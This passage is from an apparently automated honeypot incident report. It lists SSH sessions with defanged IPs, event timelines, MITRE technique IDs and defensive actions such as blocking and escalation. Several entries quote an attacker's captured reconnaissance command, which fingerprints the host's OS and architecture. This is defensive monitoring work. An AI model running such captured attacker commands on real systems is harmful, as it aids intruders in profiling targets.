- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dafc3bd66a2

| Field | Detail |
|---|---|
| **Source IP** | `112.27.38[.]203` |
| **First Seen** | 2026-07-30 15:02 |
| **Last Seen** | 2026-07-30 15:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:02:45` | `cowrie.session.connect` |
| `2026-07-30 15:02:46` | `cowrie.client.version` |
| `2026-07-30 15:02:46` | `cowrie.client.kex` |
| `2026-07-30 15:02:49` | `cowrie.login.success` |
| `2026-07-30 15:02:50` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.38[.]203` to AbuseIPDB if not already reported
- [ ] Block `112.27.38[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38070a6077cb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 15:03 |
| **Last Seen** | 2026-07-30 15:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:03:09` | `cowrie.session.connect` |
| `2026-07-30 15:03:09` | `cowrie.client.version` |
| `2026-07-30 15:03:09` | `cowrie.client.kex` |
| `2026-07-30 15:03:09` | `cowrie.login.success` |
| `2026-07-30 15:03:09` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:03:09` | `cowrie.direct-tcpip.data` |
| `2026-07-30 15:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52708dcb2578

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-07-30 15:08 |
| **Last Seen** | 2026-07-30 15:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:08:02` | `cowrie.session.connect` |
| `2026-07-30 15:08:03` | `cowrie.client.version` |
| `2026-07-30 15:08:03` | `cowrie.client.kex` |
| `2026-07-30 15:08:05` | `cowrie.login.success` |
| `2026-07-30 15:08:06` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abdb29269749

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]50` |
| **First Seen** | 2026-07-30 15:17 |
| **Last Seen** | 2026-07-30 15:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:17:05` | `cowrie.session.connect` |
| `2026-07-30 15:17:06` | `cowrie.client.version` |
| `2026-07-30 15:17:06` | `cowrie.client.kex` |
| `2026-07-30 15:17:09` | `cowrie.login.success` |
| `2026-07-30 15:17:10` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]50` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e54fbcbdceec

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 15:21 |
| **Last Seen** | 2026-07-30 15:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:21:08` | `cowrie.session.connect` |
| `2026-07-30 15:21:08` | `cowrie.client.version` |
| `2026-07-30 15:21:08` | `cowrie.client.kex` |
| `2026-07-30 15:21:09` | `cowrie.login.success` |
| `2026-07-30 15:21:09` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:21:09` | `cowrie.direct-tcpip.data` |
| `2026-07-30 15:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db1167c33be

| Field | Detail |
|---|---|
| **Source IP** | `58.17.128[.]7` |
| **First Seen** | 2026-07-30 15:24 |
| **Last Seen** | 2026-07-30 15:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:24:13` | `cowrie.session.connect` |
| `2026-07-30 15:24:13` | `cowrie.client.version` |
| `2026-07-30 15:24:13` | `cowrie.client.kex` |
| `2026-07-30 15:24:15` | `cowrie.login.success` |
| `2026-07-30 15:24:17` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.128[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.17.128[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235fac9e6761

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 15:27 |
| **Last Seen** | 2026-07-30 15:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:27:02` | `cowrie.session.connect` |
| `2026-07-30 15:27:02` | `cowrie.client.version` |
| `2026-07-30 15:27:03` | `cowrie.client.kex` |
| `2026-07-30 15:27:03` | `cowrie.login.success` |
| `2026-07-30 15:27:03` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:27:03` | `cowrie.direct-tcpip.data` |
| `2026-07-30 15:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a70aa2d063c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 15:29 |
| **Last Seen** | 2026-07-30 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:29:44` | `cowrie.session.connect` |
| `2026-07-30 15:29:44` | `cowrie.client.version` |
| `2026-07-30 15:29:44` | `cowrie.client.kex` |
| `2026-07-30 15:29:44` | `cowrie.login.success` |
| `2026-07-30 15:29:44` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:29:45` | `cowrie.direct-tcpip.data` |
| `2026-07-30 15:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d56b89a895

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-30 15:33 |
| **Last Seen** | 2026-07-30 15:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:33:55` | `cowrie.session.connect` |
| `2026-07-30 15:33:55` | `cowrie.client.version` |
| `2026-07-30 15:33:55` | `cowrie.client.kex` |
| `2026-07-30 15:33:57` | `cowrie.login.success` |
| `2026-07-30 15:33:57` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367a6eed1f3e

| Field | Detail |
|---|---|
| **Source IP** | `110.164.201[.]73` |
| **First Seen** | 2026-07-30 15:34 |
| **Last Seen** | 2026-07-30 15:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:34:03` | `cowrie.session.connect` |
| `2026-07-30 15:34:03` | `cowrie.client.version` |
| `2026-07-30 15:34:03` | `cowrie.client.kex` |
| `2026-07-30 15:34:05` | `cowrie.login.success` |
| `2026-07-30 15:34:06` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.164.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `110.164.201[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fc5180e4d8

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-30 15:37 |
| **Last Seen** | 2026-07-30 15:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:37:58` | `cowrie.session.connect` |
| `2026-07-30 15:37:59` | `cowrie.client.version` |
| `2026-07-30 15:37:59` | `cowrie.client.kex` |
| `2026-07-30 15:38:02` | `cowrie.login.success` |
| `2026-07-30 15:38:02` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66078f28c461

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-30 15:43 |
| **Last Seen** | 2026-07-30 15:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:43:11` | `cowrie.session.connect` |
| `2026-07-30 15:43:11` | `cowrie.client.version` |
| `2026-07-30 15:43:11` | `cowrie.client.kex` |
| `2026-07-30 15:43:13` | `cowrie.login.success` |
| `2026-07-30 15:43:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f47b733d3a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-30 15:52 |
| **Last Seen** | 2026-07-30 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:52:03` | `cowrie.session.connect` |
| `2026-07-30 15:52:03` | `cowrie.client.version` |
| `2026-07-30 15:52:03` | `cowrie.client.kex` |
| `2026-07-30 15:52:04` | `cowrie.login.success` |
| `2026-07-30 15:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77cf19fa2d3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-30 15:52 |
| **Last Seen** | 2026-07-30 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:52:03` | `cowrie.session.connect` |
| `2026-07-30 15:52:03` | `cowrie.client.version` |
| `2026-07-30 15:52:03` | `cowrie.client.kex` |
| `2026-07-30 15:52:04` | `cowrie.login.success` |
| `2026-07-30 15:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ebf534a560

| Field | Detail |
|---|---|
| **Source IP** | `220.189.253[.]198` |
| **First Seen** | 2026-07-30 15:52 |
| **Last Seen** | 2026-07-30 15:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:52:37` | `cowrie.session.connect` |
| `2026-07-30 15:52:38` | `cowrie.client.version` |
| `2026-07-30 15:52:38` | `cowrie.client.kex` |
| `2026-07-30 15:52:41` | `cowrie.login.success` |
| `2026-07-30 15:52:42` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.253[.]198` to AbuseIPDB if not already reported
- [ ] Block `220.189.253[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98995647218

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 15:56 |
| **Last Seen** | 2026-07-30 15:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:56:53` | `cowrie.session.connect` |
| `2026-07-30 15:56:53` | `cowrie.client.version` |
| `2026-07-30 15:56:53` | `cowrie.client.kex` |
| `2026-07-30 15:56:55` | `cowrie.login.success` |
| `2026-07-30 15:56:57` | `cowrie.session.params` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.success` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:57` | `cowrie.command.input` |
| `2026-07-30 15:56:58` | `cowrie.log.closed` |
| `2026-07-30 15:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f582c8796c2

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-30 15:58 |
| **Last Seen** | 2026-07-30 15:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:58:09` | `cowrie.session.connect` |
| `2026-07-30 15:58:10` | `cowrie.client.version` |
| `2026-07-30 15:58:10` | `cowrie.client.kex` |
| `2026-07-30 15:58:12` | `cowrie.login.success` |
| `2026-07-30 15:58:12` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3250e7d14ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 15:58 |
| **Last Seen** | 2026-07-30 15:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:58:47` | `cowrie.session.connect` |
| `2026-07-30 15:58:48` | `cowrie.client.version` |
| `2026-07-30 15:58:48` | `cowrie.client.kex` |
| `2026-07-30 15:58:50` | `cowrie.login.success` |
| `2026-07-30 15:58:51` | `cowrie.session.params` |
| `2026-07-30 15:58:51` | `cowrie.command.input` |
| `2026-07-30 15:58:51` | `cowrie.command.input` |
| `2026-07-30 15:58:51` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.success` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.command.input` |
| `2026-07-30 15:58:52` | `cowrie.log.closed` |
| `2026-07-30 15:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61765f165704

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 15:59 |
| **Last Seen** | 2026-07-30 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:59:04` | `cowrie.session.connect` |
| `2026-07-30 15:59:04` | `cowrie.client.version` |
| `2026-07-30 15:59:04` | `cowrie.client.kex` |
| `2026-07-30 15:59:04` | `cowrie.login.success` |
| `2026-07-30 15:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ca708d5ffa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 15:59 |
| **Last Seen** | 2026-07-30 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:59:05` | `cowrie.session.connect` |
| `2026-07-30 15:59:05` | `cowrie.client.version` |
| `2026-07-30 15:59:05` | `cowrie.client.kex` |
| `2026-07-30 15:59:05` | `cowrie.login.success` |
| `2026-07-30 15:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d05e12aee1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 15:59 |
| **Last Seen** | 2026-07-30 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:59:06` | `cowrie.session.connect` |
| `2026-07-30 15:59:06` | `cowrie.client.version` |
| `2026-07-30 15:59:06` | `cowrie.client.kex` |
| `2026-07-30 15:59:06` | `cowrie.login.success` |
| `2026-07-30 15:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311493b58381

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 15:59 |
| **Last Seen** | 2026-07-30 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:59:06` | `cowrie.session.connect` |
| `2026-07-30 15:59:06` | `cowrie.client.version` |
| `2026-07-30 15:59:06` | `cowrie.client.kex` |
| `2026-07-30 15:59:06` | `cowrie.login.success` |
| `2026-07-30 15:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4236d0bc161

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:00 |
| **Last Seen** | 2026-07-30 16:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:00:43` | `cowrie.session.connect` |
| `2026-07-30 16:00:43` | `cowrie.client.version` |
| `2026-07-30 16:00:43` | `cowrie.client.kex` |
| `2026-07-30 16:00:45` | `cowrie.login.success` |
| `2026-07-30 16:00:47` | `cowrie.session.params` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.success` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:47` | `cowrie.command.input` |
| `2026-07-30 16:00:48` | `cowrie.log.closed` |
| `2026-07-30 16:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9079f31083

| Field | Detail |
|---|---|
